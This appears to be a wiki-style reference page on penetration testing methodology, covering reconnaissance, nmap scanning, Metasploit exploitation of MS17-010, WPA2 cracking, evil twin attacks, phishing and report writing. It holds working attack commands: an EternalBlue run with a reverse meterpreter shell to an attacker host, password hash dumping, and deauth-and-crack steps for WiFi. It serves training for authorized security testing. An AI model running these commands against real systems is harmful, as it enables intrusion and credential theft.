---
title: Penetration Testing Methodology
category: techniques
tags: [security, pentesting, reconnaissance, exploitation, metasploit, nmap]
---

# Penetration Testing Methodology

End-to-end penetration testing workflow: reconnaissance (passive and active), scanning, exploitation with Metasploit, post-exploitation, and professional reporting. Covers infrastructure, network, and wireless attack vectors.

## Key Facts
- Pentesting phases: Recon -> Scanning -> Exploitation -> Post-Exploitation -> Reporting
- Passive recon (Shodan, DNS, OSINT) is undetectable by target
- nmap SYN scan (`-sS`) is the default stealth scan with root privileges
- Metasploit staged payloads are smaller but require callback; stageless are self-contained
- Reverse shells bypass ingress firewalls (target connects to attacker)
- Report structure: Executive Summary -> Scope -> Findings (severity-sorted) -> Evidence -> Remediation

## Reconnaissance

### Passive (No Target Contact)
```bash
# DNS enumeration
dig example.com ANY
dig axfr @ns1.example.com example.com   # Zone transfer attempt
dnsenum example.com

# Subdomain discovery
sublist3r -d example.com
amass enum -d example.com

# Email/IP harvesting
theHarvester -d example.com -b google,bing,linkedin -l 500
```

Additional passive sources: Shodan, Certificate Transparency (crt.sh), WHOIS, Google Dorking (`site:example.com filetype:pdf`).

### Active (Detectable)
Port scanning, banner grabbing, directory brute-forcing:
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u http://target.com/FUZZ
```

## Scanning

### nmap
```bash
nmap -sS target              # SYN scan (stealth, requires root)
nmap -sT target              # TCP connect (no root needed)
nmap -sU target              # UDP scan
nmap -sV target              # Service version detection
nmap -O target               # OS detection
nmap -A target               # Aggressive (OS + version + scripts + traceroute)
nmap -p- target              # All 65535 ports
nmap -sn 10.0.0.0/24        # Host discovery only (ping sweep)
nmap -Pn target              # Skip host discovery

# NSE Scripts
nmap --script vuln target                    # All vulnerability scripts
nmap --script smb-vuln-ms17-010 target       # Specific CVE check
nmap --script http-enum target               # HTTP directory enum
nmap --script "smb-*" target                 # All SMB scripts
```

### Vulnerability Scanning
- **Nessus** - commercial, most widely used
- **OpenVAS/GVM** - open-source alternative
- Authenticated scans are far more thorough than unauthenticated
- False positive management is critical - verify before reporting

## Exploitation

### Metasploit Framework
```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.0.0.5
set LHOST 10.0.0.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Meterpreter post-exploitation
sysinfo                              # System info
getuid / getsystem                   # Current user / privesc attempt
hashdump                             # Dump password hashes
shell                                # OS shell
upload /local/file /remote/path
download /remote/file /local/path
portfwd add -l 8080 -p 80 -r 10.0.0.10   # Port forwarding
```

### Payload Types
- **Staged** (`windows/meterpreter/reverse_tcp`) - small stager downloads full payload
- **Stageless** (`windows/meterpreter_reverse_tcp`) - full payload in one binary
- **Reverse shell** - target connects back to attacker (bypasses ingress firewall)
- **Bind shell** - target opens port, attacker connects

## Wireless Attacks

### WPA2 Cracking
```bash
airmon-ng start wlan0                           # Monitor mode
airodump-ng wlan0mon                            # Discover networks
airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon  # Target capture
aireplay-ng -0 5 -a BSSID wlan0mon             # Deauth (force handshake)
aircrack-ng -w wordlist.txt capture-01.cap     # Crack

# GPU-accelerated cracking
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Rogue AP / Evil Twin
Clone legitimate AP SSID, serve captive portal to capture credentials. Tools: hostapd + dnsmasq.

## Social Engineering
- **Spear phishing** - targeted emails with malicious links/attachments
- **Whaling** - targeting executives
- **Vishing** - phone-based social engineering
- **Pretexting** - fabricated scenario (impersonating IT, vendor)
- Tools: GoPhish, King Phisher

## Report Writing

### Finding Severity
| Severity | Examples |
|----------|----------|
| Critical | RCE, auth bypass, domain admin compromise |
| High | Privilege escalation, sensitive data exposure, SQLi |
| Medium | Stored XSS, CSRF, information disclosure |
| Low | Missing headers, verbose errors, outdated software (no known exploit) |
| Info | Best practice recommendations |

Each finding needs: description, business risk, step-by-step remediation, verification steps.

## Gotchas
- Always have written authorization (scope, rules of engagement) before testing
- Exploitation of one vulnerability may crash the service - test in maintenance windows when possible
- Default Metasploit payloads are detected by most AV/EDR - custom/encoded payloads needed for real engagements
- Unauthenticated nmap scans miss many vulnerabilities that authenticated scans find
- Network scanning can trigger IDS/IPS alerts and automated blocking (fail2ban)

## See Also
- [[privilege-escalation-techniques]] - Linux and Windows privesc
- [[active-directory-attacks]] - AD-specific attack paths
- [[burp-suite-and-web-pentesting]] - web application testing
- [[osint-and-reconnaissance]] - passive information gathering
